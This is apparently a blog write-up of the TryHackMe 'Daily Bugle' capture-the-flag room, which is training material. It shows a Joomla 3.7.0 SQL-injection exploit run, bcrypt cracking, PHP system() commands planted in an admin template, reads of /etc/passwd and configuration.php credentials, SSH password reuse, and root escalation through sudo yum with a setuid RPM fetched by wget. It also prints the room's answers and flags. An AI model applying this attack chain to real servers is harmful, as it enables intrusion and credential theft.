---
title: "Daily Bugle"
date: 2020-02-06T15:33:06+01:00
draft: false
tags: ["ctf", "tryhackme", "joomla", "sqli", "yum", "priviledge escalation"]
categories: ["ctf", "tryhackme"]
---

Hi guys, today we look at CTF called Daily Bugle and we try to gain root priviledges. :) 
Let's play.

__NOTICE: (SPOILER!!) If you would like to solve it by yourself, don't read this post!__

#### [Task 1]
First question is pretty simple. Open the article and you can find the answer

__Access the web server, who robbed the bank?__
- spiderman

#### [Task 2]
```bash
$ curl http://10.10.86.172/media/system/js/mootools-more.js 2>/dev/null | grep MooTools.More
MooTools.More={version:"1.4.0.1",build:"a4244edf2aa97ac8a196fc96082dd35af1abab87"};(function(){Events.Pseudos=function(h,e,f){var d="_monitorEvents:";var c=function(i){return{store:i.store?function(j,k){i.store(d+j,k);
```
```bash
$ curl http://10.10.86.172/language/en-GB/en-GB.xml
<?xml version="1.0" encoding="utf-8"?>
<metafile version="3.7" client="site">
        <name>English (en-GB)</name>
        <version>3.7.0</version>
        <creationDate>April 2017</creationDate>
        <author>Joomla! Project</author>
        <authorEmail>admin@joomla.org</authorEmail>
        <authorUrl>www.joomla.org</authorUrl>
        <copyright>Copyright (C) 2005 - 2017 Open Source Matters. All rights reserved.</copyright>
        <license>GNU General Public License version 2 or later; see LICENSE.txt</license>
        <description><![CDATA[en-GB site language]]></description>
        <metadata>
                <name>English (en-GB)</name>
                <nativeName>English (United Kingdom)</nativeName>
                <tag>en-GB</tag>
                <rtl>0</rtl>
                <locale>en_GB.utf8, en_GB.UTF-8, en_GB, eng_GB, en, english, english-uk, uk, gbr, britain, england, great britain, uk, united kingdom, united-kingdom</locale>
                <firstDay>0</firstDay>
                <weekEnd>0,6</weekEnd>
                <calendar>gregorian</calendar>
        </metadata>
        <params />
</metafile>
```

We found it.

__What is the Joomla version?__
- 3.7.0

After some research of finding following exploits for SQL Injection in Joomla
- [sqlmap](https://www.exploit-db.com/exploits/42033)
- [metasploit](https://www.rapid7.com/db/modules/exploit/unix/webapp/joomla_comfields_sqli_rce)

I found the best way to solve this task and exploit the Joomla 3.7.0 SQLi vulnerability
- [python exploit](https://github.com/XiphosResearch/exploits)

```bash
$ git clone git@github.com:XiphosResearch/exploits.git
$ cd exploits/Joomblah
```

and finally run the exploit.
```bash
$ python2 joomblah.py http://10.10.86.172
                                                                                                                    
    .---.    .-'''-.        .-'''-.                                                           
    |   |   '   _    \     '   _    \                            .---.                        
    '---' /   /` '.   \  /   /` '.   \  __  __   ___   /|        |   |            .           
    .---..   |     \  ' .   |     \  ' |  |/  `.'   `. ||        |   |          .'|           
    |   ||   '      |  '|   '      |  '|   .-.  .-.   '||        |   |         <  |           
    |   |\    \     / / \    \     / / |  |  |  |  |  |||  __    |   |    __    | |           
    |   | `.   ` ..' /   `.   ` ..' /  |  |  |  |  |  |||/'__ '. |   | .:--.'.  | | .'''-.    
    |   |    '-...-'`       '-...-'`   |  |  |  |  |  ||:/`  '. '|   |/ |   \ | | |/.'''. \   
    |   |                              |  |  |  |  |  |||     | ||   |`" __ | | |  /    | |   
    |   |                              |__|  |__|  |__|||\    / '|   | .'.''| | | |     | |   
 __.'   '                                              |/'..' / '---'/ /   | |_| |     | |   
|      '                                               '  `'-'`       \ \._,\ '/| '.    | '.  
|____.'                                                                `--'  `" '---'   '---' 

 [-] Fetching CSRF token
 [-] Testing SQLi
  -  Found table: fb9j5_users
  -  Extracting users from fb9j5_users
 [$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
  -  Extracting sessions from fb9j5_session
```

Now we need to crack the hashed password, so we save [bcrypt hash](https://www.php.net/manual/en/function.password-hash.php) to file hashes.txt
and run.
```batchfile
c:\john-1.9.0-jumbo-1-win64\run>john.exe --wordlist=C:\Users\burso\Downloads\rockyou.txt --rules=wordlist --min-len=12 --max-len=12 ../hashes.txt
Warning: detected hash type "bcrypt", but the string is also recognized as "bcrypt-opencl"
Use the "--format=bcrypt-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
spiderman123     (?)
1g 0:00:00:02 DONE (2020-02-07 10:54) 0.3846g/s 110.7p/s 110.7c/s 110.7C/s ilovepatrick..quetzalcoatl
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
__What is Jonah's cracked password?__
- spiderman123

After logged in to the __/administrator__ page with login __jonah__ and password __spiderman123__ we need to gain access to ssh.
go to page __/administrator/index.php?option=com_templates&view=template&id=506&file=L2luZGV4LnBocA__. We can edit __index.php__
of template so we can run any command on server and execute them via __Template Preview__. Before run you don't forget to save file. 
```php
system("id");
uid=48(apache) gid=48(apache) groups=48(apache) 
```

Now we now any command executed via Joomla Template will run under __apache__ user.
```php
system("cat /etc/passwd");
root:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin sync:x:5:0:sync:/sbin:/bin/sync shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown halt:x:7:0:halt:/sbin:/sbin/halt mail:x:8:12:mail:/var/spool/mail:/sbin/nologin operator:x:11:0:operator:/root:/sbin/nologin games:x:12:100:games:/usr/games:/sbin/nologin ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin nobody:x:99:99:Nobody:/:/sbin/nologin systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin dbus:x:81:81:System message bus:/:/sbin/nologin polkitd:x:999:998:User for polkitd:/:/sbin/nologin sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin postfix:x:89:89::/var/spool/postfix:/sbin/nologin chrony:x:998:996::/var/lib/chrony:/sbin/nologin jjameson:x:1000:1000:Jonah Jameson:/home/jjameson:/bin/bash apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin mysql:x:27:27:MariaDB Server:/var/lib/mysql:/sbin/nologin 
```
We can see user jonah has __jjameson__ username in ssh login, so we need password now.

```php
system("cat configuration.php");
Please check back again soon.'; public $display_offline_message = '1'; public $offline_image = ''; public $sitename = 'The Daily Bugle'; public $editor = 'tinymce'; public $captcha = '0'; public $list_limit = '20'; public $access = '1'; public $debug = '0'; public $debug_lang = '0'; public $dbtype = 'mysqli'; public $host = 'localhost'; public $user = 'root'; public $password = 'nv5uz9r3ZEDzVjNu'; public $db = 'joomla'; public $dbprefix = 'fb9j5_'; public $live_site = ''; public $secret = 'UAMBRWzHO3oFPmVC'; public $gzip = '0'; public $error_reporting = 'default'; public $helpurl = 'https://help.joomla.org/proxy/index.php?keyref=Help{major}{minor}:{keyref}'; public $ftp_host = '127.0.0.1'; public $ftp_port = '21'; public $ftp_user = ''; public $ftp_pass = ''; public $ftp_root = ''; public $ftp_enable = '0'; public $offset = 'UTC'; public $mailonline = '1'; public $mailer = 'mail'; public $mailfrom = 'jonah@tryhackme.com'; public $fromname = 'The Daily Bugle'; public $sendmail = '/usr/sbin/sendmail'; public $smtpauth = '0'; public $smtpuser = ''; public $smtppass = ''; public $smtphost = 'localhost'; public $smtpsecure = 'none'; public $smtpport = '25'; public $caching = '0'; public $cache_handler = 'file'; public $cachetime = '15'; public $cache_platformprefix = '0'; public $MetaDesc = 'New York City tabloid newspaper'; public $MetaKeys = ''; public $MetaTitle = '1'; public $MetaAuthor = '1'; public $MetaVersion = '0'; public $robots = ''; public $sef = '1'; public $sef_rewrite = '0'; public $sef_suffix = '0'; public $unicodeslugs = '0'; public $feed_limit = '10'; public $feed_email = 'none'; public $log_path = '/var/www/html/administrator/logs'; public $tmp_path = '/var/www/html/tmp'; public $lifetime = '15'; public $session_handler = 'database'; public $shared_session = '0'; } 
```
Interesting. We can try the password to database if it is not the same to __jjameson__ ssh login.
- __username__: jjamesson
- __password__: nv5uz9r3ZEDzVjNu

```bash
$ ssh jjameson@10.10.86.172
jjameson@10.10.162.2's password: 
Last failed login: Fri Feb  7 10:07:52 EST 2020 from ip-10-8-11-158.eu-west-1.compute.internal on ssh:notty
There were 724 failed login attempts since the last successful login.
Last login: Mon Dec 16 05:14:55 2019 from netwars
```

Yes, everything works! 
```bash
[jjameson@dailybugle ~]$ ls
user.txt
[jjameson@dailybugle ~]$ cat user.txt 
27a260fe3cba712cfdedb1c86d80442e
```

__What is the user flag?__
- 27a260fe3cba712cfdedb1c86d80442e

The last step is gain root access on this machine. So let's do it!

```bash
[jjameson@dailybugle ~]$ sudo -l                                                                                                                                                                                    
Matching Defaults entries for jjameson on dailybugle:                                                                                                                                                               
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS     
    LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET       
    XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin                                                                                                                                                       
                                                                                                                                                                                                                    
User jjameson may run the following commands on dailybugle:                                                                                                                                                         
    (ALL) NOPASSWD: /usr/bin/yum
```
__Yum__ is the only one command you can run under __root__ and that's security missconfiguration. 
More about the vulnerability you can find [here](https://lsdsecurity.com/2019/01/more-linux-privilege-escalation-yum-rpm-dnf-nopasswd-rpm-payloads/).
You can download the exploit [here](https://gist.githubusercontent.com/neoice/797777cb0832f596a70b6cba7bbbcc4f/raw/f3f94e105c23d2c01706736d9cd729dd555e9c53/setuid-pop.rpm)

So let's download the exploit and copy to vulnerable server
```bash
$ wget https://gist.githubusercontent.com/neoice/797777cb0832f596a70b6cba7bbbcc4f/raw/f3f94e105c23d2c01706736d9cd729dd555e9c53/setuid-pop.rpm
$ scp setuid-pop.rpm jjameson@10.10.86.172:~
```

Now extract the exploit and install it via __yum__
```bash
[jjameson@dailybugle ~]$ cat setuid-pop.rpm | base64 -d | gzip -d > yumsploit.rpm
[jjameson@dailybugle ~]$ sudo yum localinstall ~/yumsploit.rpm 
Loaded plugins: fastestmirror
Examining /home/jjameson/yumsploit.rpm: sploit-1.0-1.x86_64
Marking /home/jjameson/yumsploit.rpm to be installed
Resolving Dependencies
--> Running transaction check
---> Package sploit.x86_64 0:1.0-1 will be installed
--> Finished Dependency Resolution

Dependencies Resolved
...
Downloading packages:
Running transaction check
Running transaction test
Transaction test succeeded
Running transaction
  Installing : sploit-1.0-1.x86_64                                                                                                                                                                              1/1 
  Verifying  : sploit-1.0-1.x86_64                                                                                                                                                                              1/1 

Installed:
  sploit.x86_64 0:1.0-1                              

Complete!
```

We have installed __pop__ binary in __/usr/local/bin__ directory with __setuid bit__.
That means __pop__ binary will be runned with __root__ priviledges. 
```bash
meson@dailybugle ~]$ ls -la /usr/local/bin
total 12
drwxr-xr-x.  2 root root   17 Feb  7 10:43 .
drwxr-xr-x. 12 root root  131 Dec 14 13:57 ..
-rwsr-sr-x   1 root root 8744 Jan 18  2019 pop
```

Let's execute it.
```bash
[jjameson@dailybugle ~]$ pop
[root@dailybugle ~]# id
uid=0(root) gid=0(root) groups=0(root),1000(jjameson) 
[root@dailybugle ~]# cat /root/root.txt
eec3d53292b1821868266858d7fa6f79
```

Done! We have now __root__ priviledges.

__What is the root flag?__
- eec3d53292b1821868266858d7fa6f79

